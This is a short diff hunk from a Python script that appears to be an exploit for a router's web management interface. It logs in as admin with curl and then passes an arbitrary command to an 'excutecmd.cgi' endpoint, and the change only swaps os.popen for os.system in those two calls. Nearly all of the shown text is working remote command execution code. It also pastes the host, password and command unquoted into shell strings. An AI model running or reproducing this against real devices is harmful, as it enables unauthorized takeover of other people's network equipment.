@@ -13,8 +13,8 @@ except:
     exit()
 
 #Login and send cmd_to_execute
-disregard_output = os.popen('curl -bcookie.txt -ccookie.txt -H"Cookie: SessionID_R3=0; FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en" -d"Username=admin&Password=' + password + '" -s "http://' + host +'/index/login.cgi"').read()
-disregard_output = os.popen('curl -bcookie.txt -ccookie.txt -d"foobar" -s "http://' + host + '/html/management/excutecmd.cgi?cmd=' + cmd_to_execute + '&RequestFile=/html/management/diagnose.asp"').read()
+os.system('curl -bcookie.txt -ccookie.txt -H"Cookie: SessionID_R3=0; FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en" -d"Username=admin&Password=' + password + '" -s "http://' + host +'/index/login.cgi"')
+os.system('curl -bcookie.txt -ccookie.txt -d"foobar" -s "http://' + host + '/html/management/excutecmd.cgi?cmd=' + cmd_to_execute + '&RequestFile=/html/management/diagnose.asp"')
 
 #Get output from cmd_to_execute
 if os.name == 'nt':
